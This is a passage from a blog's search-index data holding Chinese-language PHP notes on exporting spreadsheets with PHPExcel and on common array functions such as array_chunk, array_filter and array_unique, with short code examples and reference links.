class=\"string\">\"標題名稱\"</span>);  <span class=\"comment\">//設定標題</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"動態處理橫軸資料-A-AZ\"><a href=\"#動態處理橫軸資料-A-AZ\" class=\"headerlink\" title=\"動態處理橫軸資料(A~AZ)\"></a>動態處理橫軸資料(A~AZ)</h2><p>PHPExcel 可以用 <code>$objPHPExcel-&gt;getActiveSheet()-&gt;setCellValue(&quot;A1&quot;, $month_date );</code><br>塞值真的非常方便<br>但是沒辦法動態產生資料<br>可以透過<code>setCellValueByColumnAndRow</code><br>但注意第一個欄(column 英文)是從 0 開始<br>列是從 1 開始<br><code>$objPHPExcel-&gt;getActiveSheet()-&gt;setCellValueByColumnAndRow(0, 1,&quot;2019-04月&quot;);</code></p>\n<p>但還有一個問題，就是轉換 getStyle 沒有這類似 function<br><code>PHPExcel_Cell::stringFromColumnIndex</code> 可以簡單轉換<br>stringFromColumnIndex(0) = ‘A’ &lt;=&gt; columnIndexFromString</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 一般</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;setCellValueByColumnAndRow(<span class=\"number\">0</span>, <span class=\"number\">1</span>,.<span class=\"string\">\"2019-04月\"</span>);</span><br><span class=\"line\"><span class=\"comment\">// 合併儲存格</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;mergeCellsByColumnAndRow( $index, <span class=\"number\">1</span>, $index + <span class=\"number\">8</span> , <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// PHPExcel_Cell::stringFromColumnIndex</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(PHPExcel_Cell::stringFromColumnIndex( $index ).<span class=\"string\">'1'</span>)-&gt;getAlignment()-&gt;setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(PHPExcel_Cell::stringFromColumnIndex( $index ).<span class=\"string\">'1'</span>)-&gt;getAlignment()-&gt;setVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 公式運算方法</span></span><br><span class=\"line\">$col1 = PHPExcel_Cell::stringFromColumnIndex($index + <span class=\"number\">1</span>);</span><br><span class=\"line\">$col2 = PHPExcel_Cell::stringFromColumnIndex($index + <span class=\"number\">2</span>);</span><br><span class=\"line\">$col3 = PHPExcel_Cell::stringFromColumnIndex($index + <span class=\"number\">3</span>);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;setCellValueByColumnAndRow($o2, <span class=\"string\">'4'</span>,<span class=\"string\">\"=&#123;$col1&#125;4+&#123;$col2&#125;4+&#123;$col3&#125;4\"</span>);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;setCellValueByColumnAndRow($o2, <span class=\"string\">'4'</span>,<span class=\"string\">\"=SUM(&#123;$scol&#125;$5:&#123;$scol&#125;$\"</span>.($nu+<span class=\"number\">4</span>).<span class=\"string\">\")\"</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"匯出-EXCEL\"><a href=\"#匯出-EXCEL\" class=\"headerlink\" title=\"匯出 EXCEL\"></a>匯出 EXCEL</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Export to Excel2007 (.xlsx)</span></span><br><span class=\"line\">$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, <span class=\"string\">\"Excel2007\"</span>);</span><br><span class=\"line\">$objWriter-&gt;save(<span class=\"string\">'export/filename.xlsx'</span>);</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://ron314159.blogspot.com/2011/02/phpexcel.html\" target=\"_blank\" rel=\"noopener\">Ron, Run ~~: PHPExcel - 如何設定儲存格代號</a><br><a href=\"https://www.puritys.me/docs-blog/article-33-PHP-%E8%BC%B8%E5%87%BA-Excel-%EF%BC%8C%E4%BD%BF%E7%94%A8PHPExcel.html\" target=\"_blank\" rel=\"noopener\">PHP 輸出 Excel ，使用 PHPExcel</a><br><a href=\"https://www.itread01.com/content/1507728009.html\" target=\"_blank\" rel=\"noopener\">PHP excel 設置參數 - IT 閱讀</a></p>\n<h2 id=\"其他程式使用方式\"><a href=\"#其他程式使用方式\" class=\"headerlink\" title=\"其他程式使用方式\"></a>其他程式使用方式</h2><p>Java 使用 POI 方式<br>但我覺得不好用….</p>\n<p>JavaScript 有找到 js-xlsx，做匯入資料感覺非常方便<br>一般報表還可以，複雜格式報表可能不行<br>但是進階設定需要付費，所以還是很可惜</p>\n<p><a href=\"https://aotu.io/notes/2016/04/07/node-excel/index.html\" target=\"_blank\" rel=\"noopener\">Node 读写 Excel 文件探究实践 | Aotu.io「凹凸实验室」</a><br><a href=\"https://www.jianshu.com/p/877631e7e411\" target=\"_blank\" rel=\"noopener\">【node+demo】使用 xlsx-style 设置表格的宽高等样式 - 简书</a><br><a href=\"https://segmentfault.com/a/1190000019700368\" target=\"_blank\" rel=\"noopener\">使用 js-xlsx 纯前端导出 excel - 个人文章 - SegmentFault 思否</a><br>不知道為什麼範例沒辦法用出顏色</p>\n<p>網路文章:</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/6820250/merge-cell-values-with-phpexcel-php\" target=\"_blank\" rel=\"noopener\">Merge Cell values with PHPExcel - PHP - Stack Overflow</a></li>\n<li><a href=\"https://www.puritys.me/docs-blog/article-33-PHP-%E8%BC%B8%E5%87%BA-Excel-%EF%BC%8C%E4%BD%BF%E7%94%A8PHPExcel.html\" target=\"_blank\" rel=\"noopener\">PHP 輸出 Excel ，使用 PHPExcel</a></li>\n<li><a href=\"https://blog.csdn.net/gezhonglei2007/article/details/51475059\" target=\"_blank\" rel=\"noopener\">基于 Excel 模板导出——ExcelTemplate - gezhonglei2007 的专栏 - CSDN 博客</a></li>\n<li><a href=\"https://www.cnblogs.com/leestar54/p/7786806.html\" target=\"_blank\" rel=\"noopener\">phpspreadsheet 开发手记 - leestar54 - 博客园</a></li>\n<li><a href=\"https://github.com/PHPOffice/PHPExcel/issues/307\" target=\"_blank\" rel=\"noopener\">columnIndexFromString and stringFromColumnIndex are not compatible · Issue #307 · PHPOffice/PHPExcel</a></li>\n<li><a href=\"https://github.com/SheetJS/js-xlsx/issues/964\" target=\"_blank\" rel=\"noopener\">merge cells from Array of Arrays · Issue #964 · SheetJS/js-xlsx</a></li>\n<li><a href=\"https://www.jianshu.com/p/869375439fee\" target=\"_blank\" rel=\"noopener\">纯前端利用 js-xlsx 之单元格样式(4) - 简书</a></li>\n<li><a href=\"https://gist.github.com/yajra/a71d030e68126714e88a\" target=\"_blank\" rel=\"noopener\">PHPExcel Notes and code snippets</a></li>\n</ul>\n<p>公司有遇到RAM 吃很大的問題<br><a href=\"https://www.cnblogs.com/cocowool/p/6893774.html\" target=\"_blank\" rel=\"noopener\">phpExcel導出文件時內存溢出的問題 - Cocowool - 博客園</a></p>\n<ul>\n<li><a href=\"https://github.com/mk-j/PHP_XLSXWriter\" target=\"_blank\" rel=\"noopener\">mk-j/PHP_XLSXWriter: Lightwight XLSX Excel Spreadsheet Writer in PHP</a></li>\n</ul>\n","categories":["PHP"],"tags":["phpexcel"]},{"title":"PHP 陣列實用函式小記","url":"/blog/2019/06/29/PHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98/","content":"<p>寫了 PHP 一陣子<br>PHP array function 非常多<br>所以不是很熟<br>最近做案子有用到一些實用的<br>做一下筆記，方便快速尋找</p>\n<a id=\"more\"></a>\n<h2 id=\"array-chunk\"><a href=\"#array-chunk\" class=\"headerlink\" title=\"array_chunk\"></a>array_chunk</h2><p>陣列切割多個區塊函式<br>簡單說明一下，有時候需要多批陣列<br>這時候就用得到這個函式<br><code>array_chunk ( array $array , int $size [, bool $preserve_keys = FALSE ] ) : array</code><br>第三個參數是否要保留 key<br><a href=\"https://www.php.net/manual/en/function.array-chunk.php\" target=\"_blank\" rel=\"noopener\">PHP: array_chunk - Manual</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">partition</span><span class=\"params\">( $list, $p )</span> </span>&#123;</span><br><span class=\"line\">    $listlen = count( $list );</span><br><span class=\"line\">    $partlen = floor( $listlen / $p );</span><br><span class=\"line\">    $partrem = $listlen % $p;</span><br><span class=\"line\">    $partition = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    $mark = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ($px = <span class=\"number\">0</span>; $px &lt; $p; $px++) &#123;</span><br><span class=\"line\">        $incr = ($px &lt; $partrem) ? $partlen + <span class=\"number\">1</span> : $partlen;</span><br><span class=\"line\">        $partition[$px] = array_slice( $list, $mark, $incr );</span><br><span class=\"line\">        $mark += $incr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $partition;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$citylist = <span class=\"keyword\">array</span>( <span class=\"string\">\"Black Canyon City\"</span>, <span class=\"string\">\"Chandler\"</span>, <span class=\"string\">\"Flagstaff\"</span>, <span class=\"string\">\"Gilbert\"</span>, <span class=\"string\">\"Glendale\"</span>, <span class=\"string\">\"Globe\"</span>, <span class=\"string\">\"Mesa\"</span>, <span class=\"string\">\"Miami\"</span>,</span><br><span class=\"line\">                   <span class=\"string\">\"Phoenix\"</span>, <span class=\"string\">\"Peoria\"</span>, <span class=\"string\">\"Prescott\"</span>, <span class=\"string\">\"Scottsdale\"</span>, <span class=\"string\">\"Sun City\"</span>, <span class=\"string\">\"Surprise\"</span>, <span class=\"string\">\"Tempe\"</span>, <span class=\"string\">\"Tucson\"</span>, <span class=\"string\">\"Wickenburg\"</span> );</span><br><span class=\"line\">print_r( partition( $citylist, <span class=\"number\">3</span> ) );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>剛好官網看到很有趣的寫法<br>partition 決定個數，依照陣列做切割<br>感覺有機會用到</p>\n<h2 id=\"array-column\"><a href=\"#array-column\" class=\"headerlink\" title=\"array_column\"></a>array_column</h2><p>對二維陣列對裡面第一層抓取 key 資料出來。</p>\n<p><code>array_column ( array $input , mixed $column_key [, mixed $index_key = null ] ) : array</code></p>\n<p>感覺很適合 Database 搜尋出來資料，抓取部分欄位。<br>這時可以用 array_filter,array_unique,array_values 做整理。<br>相當實用!!</p>\n<p><a href=\"https://www.php.net/manual/zh/function.array-column.php\" target=\"_blank\" rel=\"noopener\">PHP: array_column - Manual</a></p>\n<p>當然用途還滿多了，第一個能對<strong>isset,</strong>get 模術方法去抓資料</p>\n<h2 id=\"array-count-value\"><a href=\"#array-count-value\" class=\"headerlink\" title=\"array_count_value\"></a>array_count_value</h2><p><code>array_count_values ( array $array ) : array</code><br>統計數組中所有的值</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$array = <span class=\"keyword\">array</span>(<span class=\"number\">1</span>, <span class=\"string\">\"hello\"</span>, <span class=\"number\">1</span>, <span class=\"string\">\"world\"</span>, <span class=\"string\">\"hello\"</span>);</span><br><span class=\"line\">print_r(array_count_values($array));</span><br><span class=\"line\"><span class=\"comment\">// Array</span></span><br><span class=\"line\"><span class=\"comment\">// (</span></span><br><span class=\"line\"><span class=\"comment\">//     [1] =&gt; 2</span></span><br><span class=\"line\"><span class=\"comment\">//     [hello] =&gt; 2</span></span><br><span class=\"line\"><span class=\"comment\">//     [world] =&gt; 1</span></span><br><span class=\"line\"><span class=\"comment\">// )</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.php.net/manual/zh/function.array-count-values.php\" target=\"_blank\" rel=\"noopener\">PHP: array_count_values - Manual</a></p>\n<h2 id=\"array-diff\"><a href=\"#array-diff\" class=\"headerlink\" title=\"array_diff\"></a>array_diff</h2><p><code>array_diff ( array $array1 , array $array2 [, array $... ] ) : array</code></p>\n<p>對比 array1 和其他一個或者多個數組，返回在 array1 中但是不在其他 array 裡的值。</p>\n<p>目前沒什麼用到，但感覺還是有用處的…</p>\n<h2 id=\"array-fill\"><a href=\"#array-fill\" class=\"headerlink\" title=\"array_fill\"></a>array_fill</h2><p><code>array_fill ( int $start_index , int $num , mixed $value ) : array</code></p>\n<p>填充陣列用的函式。</p>\n<p><a href=\"https://www.php.net/manual/zh/function.array-fill.php\" target=\"_blank\" rel=\"noopener\">PHP: array_fill - Manual</a></p>\n<h2 id=\"array-filter\"><a href=\"#array-filter\" class=\"headerlink\" title=\"array_filter\"></a>array_filter</h2><p><code>array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array</code></p>\n<p>過濾陣列(自定)函式。</p>\n<p>我覺得還滿實用的!!<br>當 callback 沒有設定，預設 null, ‘’(空字串)都會被清除<br>相當實用!!!</p>\n<blockquote>\n<p>callback<br>使用的回调函数</p>\n</blockquote>\n<p>如果没有提供 callback 函数， 将删除 array 中所有等值为 FALSE 的条目。更多信息见转换为布尔值。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$arr = [<span class=\"string\">'a'</span> =&gt; <span class=\"number\">1</span>, <span class=\"string\">'b'</span> =&gt; <span class=\"number\">2</span>, <span class=\"string\">'c'</span> =&gt; <span class=\"number\">3</span>, <span class=\"string\">'d'</span> =&gt; <span class=\"number\">4</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump(array_filter($arr, <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">($k)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $k == <span class=\"string\">'b'</span>;</span><br><span class=\"line\">&#125;, ARRAY_FILTER_USE_KEY));</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump(array_filter($arr, <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">($v, $k)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $k == <span class=\"string\">'b'</span> || $v == <span class=\"number\">4</span>;</span><br><span class=\"line\">&#125;, ARRAY_FILTER_USE_BOTH));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\">// array(1) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//   [\"b\"]=&gt;</span></span><br><span class=\"line\"><span class=\"comment\">//   int(2)</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br><span class=\"line\"><span class=\"comment\">// array(2) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//   [\"b\"]=&gt;</span></span><br><span class=\"line\"><span class=\"comment\">//   int(2)</span></span><br><span class=\"line\"><span class=\"comment\">//   [\"d\"]=&gt;</span></span><br><span class=\"line\"><span class=\"comment\">//   int(4)</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"array-flip\"><a href=\"#array-flip\" class=\"headerlink\" title=\"array_flip\"></a>array_flip</h2><p>陣列 key 跟 value 做交換</p>\n<p><code>array_flip ( array $array ) : array</code></p>\n<p>算是滿實用的函式。</p>\n<h2 id=\"array-push-amp-var\"><a href=\"#array-push-amp-var\" class=\"headerlink\" title=\"array_push &amp; \\$var[]\"></a>array_push &amp; \\$var[]</h2><p><code>array_push ( array &amp;$array , mixed $value1 [, mixed $... ] ) : int</code><br>回傳 增加數量。</p>\n<p>但還是推薦使用<code>$var[]</code></p>\n<h3 id=\"array-unshift\"><a href=\"#array-unshift\" class=\"headerlink\" title=\"array_unshift\"></a>array_unshift</h3><p>跟上一個<code>array_push</code>很像，但他是加在陣列前面</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$queue = <span class=\"keyword\">array</span>(<span class=\"string\">\"orange\"</span>, <span class=\"string\">\"banana\"</span>);</span><br><span class=\"line\">array_unshift($queue, <span class=\"string\">\"apple\"</span>, <span class=\"string\">\"raspberry\"</span>);</span><br><span class=\"line\">print_r($queue);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\">// Array</span></span><br><span class=\"line\"><span class=\"comment\">// (</span></span><br><span class=\"line\"><span class=\"comment\">//     [0] =&gt; apple</span></span><br><span class=\"line\"><span class=\"comment\">//     [1] =&gt; raspberry</span></span><br><span class=\"line\"><span class=\"comment\">//     [2] =&gt; orange</span></span><br><span class=\"line\"><span class=\"comment\">//     [3] =&gt; banana</span></span><br><span class=\"line\"><span class=\"comment\">// )</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"array-pop\"><a href=\"#array-pop\" class=\"headerlink\" title=\"array_pop\"></a>array_pop</h3><p>移除(回傳)後面陣列</p>\n<h3 id=\"array-shift\"><a href=\"#array-shift\" class=\"headerlink\" title=\"array_shift\"></a>array_shift</h3><p>移除(回傳)前面陣列</p>\n<h2 id=\"array-rand\"><a href=\"#array-rand\" class=\"headerlink\" title=\"array_rand\"></a>array_rand</h2><p><code>array_rand ( array $array [, int $num = 1 ] ): mixed</code></p>\n<p>隨機回傳陣列，第二個陣列可以回傳隨機個數</p>\n<p>感覺實用!!</p>\n<h2 id=\"array-slice\"><a href=\"#array-slice\" class=\"headerlink\" title=\"array_slice\"></a>array_slice</h2><p><code>array_slice ( array $array , int $offset [, int $length = NULL [, bool $preserve_keys = false ]] ) : array</code></p>\n<p>從陣列中取出一段。</p>\n<p>比較特別的是 <code>$offset</code>,<code>$length</code> 可以用負數，為負數代表就是抓取後面位置<br><code>$offset</code>,<code>$length</code> 可容錯，不會有溢位的問題!!相當時用</p>\n<p><strong>2019-07-01</strong><br>今天做這個有 index(key)容錯<br>假如長度少於 key 內容，會取出陣列最後面一個位置<br>算是滿好用。<br>array_unique 後可以省略做 array_values<br>直接做 array_slice<br>真的非常方便</p>\n<p>array_unique 也可以比對整個 array,object<br><code>sort($arr, SORT_STRING);</code><br>原理如下網站<br><a href=\"https://segmentfault.com/a/1190000018487764\" target=\"_blank\" rel=\"noopener\">PHP 排序模式 SORT_NUMERIC / SORT_STRING / SORT_NATURAL 详解</a> <a href=\"/blog/2019/06/29/PHP-陣列實用涵式小記/web1.png\" title=\"備份圖\">備份圖</a></p>\n<h2 id=\"array-splice\"><a href=\"#array-splice\" class=\"headerlink\" title=\"array_splice\"></a>array_splice</h2><p><code>array_splice ( array &amp;$input , int $offset [, int $length = count($input) [, mixed $replacement = array() ]] ) : array</code></p>\n<h2 id=\"array-sum\"><a href=\"#array-sum\" class=\"headerlink\" title=\"array_sum\"></a>array_sum</h2><p>把所有陣列做加總。</p>\n<h2 id=\"array-search\"><a href=\"#array-search\" class=\"headerlink\" title=\"array_search\"></a>array_search</h2><p><code>array_search ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : mixed</code></p>\n<p>陣列搜尋，會回傳找到的<del>位置</del>正確說是 key 值。</p>\n<h3 id=\"多維度搜尋\"><a href=\"#多維度搜尋\" class=\"headerlink\" title=\"多維度搜尋\"></a>多維度搜尋</h3><p>跟 array_search 神搭配</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// $userdb=Array</span></span><br><span class=\"line\"><span class=\"comment\">// (</span></span><br><span class=\"line\"><span class=\"comment\">//     (0) =&gt; Array</span></span><br><span class=\"line\"><span class=\"comment\">//         (</span></span><br><span class=\"line\"><span class=\"comment\">//             (uid) =&gt; '100',</span></span><br><span class=\"line\"><span class=\"comment\">//             (name) =&gt; 'Sandra Shush',</span></span><br><span class=\"line\"><span class=\"comment\">//             (url) =&gt; 'urlof100'</span></span><br><span class=\"line\"><span class=\"comment\">//         ),</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//     (1) =&gt; Array</span></span><br><span class=\"line\"><span class=\"comment\">//         (</span></span><br><span class=\"line\"><span class=\"comment\">//             (uid) =&gt; '5465',</span></span><br><span class=\"line\"><span class=\"comment\">//             (name) =&gt; 'Stefanie Mcmohn',</span></span><br><span class=\"line\"><span class=\"comment\">//             (pic_square) =&gt; 'urlof100'</span></span><br><span class=\"line\"><span class=\"comment\">//         ),</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//     (2) =&gt; Array</span></span><br><span class=\"line\"><span class=\"comment\">//         (</span></span><br><span class=\"line\"><span class=\"comment\">//             (uid) =&gt; '40489',</span></span><br><span class=\"line\"><span class=\"comment\">//             (name) =&gt; 'Michael',</span></span><br><span class=\"line\"><span class=\"comment\">//             (pic_square) =&gt; 'urlof40489'</span></span><br><span class=\"line\"><span class=\"comment\">//         )</span></span><br><span class=\"line\"><span class=\"comment\">// );</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$key = array_search(<span class=\"number\">40489</span>, array_column($userdb, <span class=\"string\">'uid'</span>));</span><br></pre></td></tr></table></figure>\n<h3 id=\"查詢最後一個-key\"><a href=\"#查詢最後一個-key\" class=\"headerlink\" title=\"查詢最後一個 key\"></a>查詢最後一個 key</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">array_search(<span class=\"string\">'green'</span>, array_reverse($array));</span><br></pre></td></tr></table></figure>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/21223286/how-do-i-find-last-occurence-of-needle-in-array-php\" target=\"_blank\" rel=\"noopener\">How do I find last occurence of “needle” in array php - Stack Overflow</a></li>\n</ul>\n<h2 id=\"array-unique\"><a href=\"#array-unique\" class=\"headerlink\" title=\"array_unique\"></a>array_unique</h2><p><code>array_unique ( array $array [, int $sort_flags = SORT_STRING ] ) : array</code></p>\n<blockquote>\n<p>sort_flags</p>\n<p>第二個可選參數 sort_flags 可用於修改排序行為：</p>\n<p>排序類型標記：<br>SORT_REGULAR - 按照通常方法比較（不修改類型）<br>SORT_NUMERIC - 按照數字形式比較<br>SORT_STRING - 按照字符串形式比較<br>SORT_LOCALE_STRING - 根據當前的本地化設置，按照字符串比較。</p>\n</blockquote>\n<p><strong>但我覺得注意 array_unique 移除 value，但是不會合併</strong><br><strong>切記可以需要做 array_value or array_slice</strong><br><strong>切記可以需要做 array_value or array_slice</strong><br><strong>切記可以需要做 array_value or array_slice</strong></p>\n<p>也非一定要用上面兩個<br>可以做<code>foreach</code><br>但是做<code>for($i = 0;$i &lt; count(xxx); $i++)</code> (PS: $cnt = count(xxx); for($i = 0; $i &lt; $cnt; \\$i++&gt;)會比較好)<br>可能需要注意會有問題!!!</p>\n<h3 id=\"類似對二維陣列做-array-column-方法\"><a href=\"#類似對二維陣列做-array-column-方法\" class=\"headerlink\" title=\"類似對二維陣列做 array_column 方法\"></a>類似對二維陣列做 array_column 方法</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$details = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"number\">0</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">\"id\"</span>=&gt;<span class=\"string\">\"1\"</span>, <span class=\"string\">\"name\"</span>=&gt;<span class=\"string\">\"Mike\"</span>,    <span class=\"string\">\"num\"</span>=&gt;<span class=\"string\">\"9876543210\"</span>),</span><br><span class=\"line\">    <span class=\"number\">1</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">\"id\"</span>=&gt;<span class=\"string\">\"2\"</span>, <span class=\"string\">\"name\"</span>=&gt;<span class=\"string\">\"Carissa\"</span>, <span class=\"string\">\"num\"</span>=&gt;<span class=\"string\">\"08548596258\"</span>),</span><br><span class=\"line\">    <span class=\"number\">2</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">\"id\"</span>=&gt;<span class=\"string\">\"1\"</span>, <span class=\"string\">\"name\"</span>=&gt;<span class=\"string\">\"Mathew\"</span>,  <span class=\"string\">\"num\"</span>=&gt;<span class=\"string\">\"784581254\"</span>),</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">unique_multidim_array</span><span class=\"params\">($array, $key)</span> </span>&#123;</span><br><span class=\"line\">    $temp_array = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    $i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    $key_array = <span class=\"keyword\">array</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span>($array <span class=\"keyword\">as</span> $val) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array($val[$key], $key_array)) &#123;</span><br><span class=\"line\">            $key_array[$i] = $val[$key];</span><br><span class=\"line\">            $temp_array[$i] = $val;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $i++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $temp_array;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$details = unique_multidim_array($details,<span class=\"string\">'id'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// $details = array(</span></span><br><span class=\"line\"><span class=\"comment\">//     0 =&gt; array(\"id\"=&gt;\"1\",\"name\"=&gt;\"Mike\",\"num\"=&gt;\"9876543210\"),</span></span><br><span class=\"line\"><span class=\"comment\">//     1 =&gt; array(\"id\"=&gt;\"2\",\"name\"=&gt;\"Carissa\",\"num\"=&gt;\"08548596258\"),</span></span><br><span class=\"line\"><span class=\"comment\">// );</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"array-values\"><a href=\"#array-values\" class=\"headerlink\" title=\"array_values\"></a>array_values</h2><p>我以為有排序合併效果，但是沒有!!</p>\n<p>詳細看官往範例</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$a = <span class=\"keyword\">array</span>(</span><br><span class=\"line\"><span class=\"number\">3</span> =&gt; <span class=\"number\">11</span>,</span><br><span class=\"line\"><span class=\"number\">1</span> =&gt; <span class=\"number\">22</span>,</span><br><span class=\"line\"><span class=\"number\">2</span> =&gt; <span class=\"number\">33</span>,</span><br><span class=\"line\">);</span><br><span class=\"line\">$a[<span class=\"number\">0</span>] = <span class=\"number\">44</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">print_r( array_values( $a ));</span><br><span class=\"line\"><span class=\"comment\">// ==&gt;</span></span><br><span class=\"line\"><span class=\"comment\">// Array(</span></span><br><span class=\"line\"><span class=\"comment\">//   [0] =&gt; 11</span></span><br><span class=\"line\"><span class=\"comment\">//   [1] =&gt; 22</span></span><br><span class=\"line\"><span class=\"comment\">//   [2] =&gt; 33</span></span><br><span class=\"line\"><span class=\"comment\">//   [3] =&gt; 44</span></span><br><span class=\"line\"><span class=\"comment\">// )</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"array-walk-vs-array-map\"><a href=\"#array-walk-vs-array-map\" class=\"headerlink\" title=\"array_walk vs array_map\"></a>array_walk vs array_map</h2><p>我目前還很少用到這些，不過這個函式也滿像的，所以特別記錄一下。</p>\n<p>簡單說最大的差異 array_walk 會回傳 <code>true</code>,<code>false</code>，array_map 會回傳 callback 傳回去資料<br>假如要對原資料變數做更動，使用 array_walk ，<strong>但切記宣告記得在<code>function callback(&amp;$xxx,...)</code></strong>(&amp;符號)</p>\n<p>光<code>&amp;</code>這點我覺得不是很實用了</p>\n<p>詳細：<a href=\"https://blog.csdn.net/u013372487/article/details/51568629\" target=\"_blank\" rel=\"noopener\">php array_map 与 array_walk 使用对比 - 偶木 - CSDN 博客</a></p>\n<h2 id=\"in-array\"><a href=\"#in-array\" class=\"headerlink\" title=\"in_array\"></a>in_array</h2><p><code>in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool</code></p>\n<p>跟 array_search 有點像，但 return 回去是 bollean<br>詳細可參考：</p>\n<ul>\n<li><a href=\"https://richarlin.tw/blog/php-in_array-array_search/\" target=\"_blank\" rel=\"noopener\">[PHP] in_array 與 array_search 在陣列(Array)中尋找值是否存在 - RicharLin.Tw</a></li>\n</ul>\n<h2 id=\"usort-uksort\"><a href=\"#usort-uksort\" class=\"headerlink\" title=\"usort,uksort\"></a>usort,uksort</h2><p>自定排序</p>\n<p>其實我對 callback 排序記不太住</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//由小排到大</span></span><br><span class=\"line\">$arr = [<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">4</span>];</span><br><span class=\"line\">usort($arr,<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">($a,$b)</span></span>&#123; <span class=\"keyword\">return</span> $a &gt; $b&#125;); <span class=\"comment\">//大於、負數在前(false)由小排到大</span></span><br><span class=\"line\">$arr = [<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span 